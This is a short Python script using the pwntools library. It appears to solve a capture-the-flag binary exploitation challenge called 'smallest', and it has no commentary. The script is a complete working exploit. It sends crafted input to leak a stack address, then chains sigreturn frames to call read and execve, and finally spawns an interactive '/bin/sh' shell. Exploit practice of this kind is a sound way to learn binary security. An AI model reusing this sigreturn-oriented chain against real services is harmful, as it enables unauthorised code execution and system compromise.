from pwn import *

sh = process("./smallest")
context( arch='amd64', log_level='debug')

syscall_ret = 0x4000BE
start_add = 0x4000B0
sh.send(p64(start_add) * 3)

sh.send(b'\xb3')
stack_add = u64(sh.recv()[8: 16])
log.success('leak stack addr :' + hex(stack_add))

sigframe = SigreturnFrame()
sigframe.rax = 0
sigframe.rdi = 0
sigframe.rsi = stack_add
sigframe.rdx = 0x400
sigframe.rsp = stack_add
sigframe.rip = syscall_ret
payload = flat(p64(start_add), p64(syscall_ret), bytes(sigframe))
sh.send(payload)

sigreturn = payload[8: 23]
sh.send(sigreturn)

sigframe = SigreturnFrame()
sigframe.rax = 59
sigframe.rdi = stack_add + 0x120
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = stack_add
sigframe.rip = syscall_ret

frame_payload = flat(p64(start_add), p64(syscall_ret), bytes(sigframe))
payload = flat(frame_payload, (0x120 - len(frame_payload)) * b'\x00', b'/bin/sh\x00')
sh.send(payload)
sh.send(sigreturn)
sh.interactive()
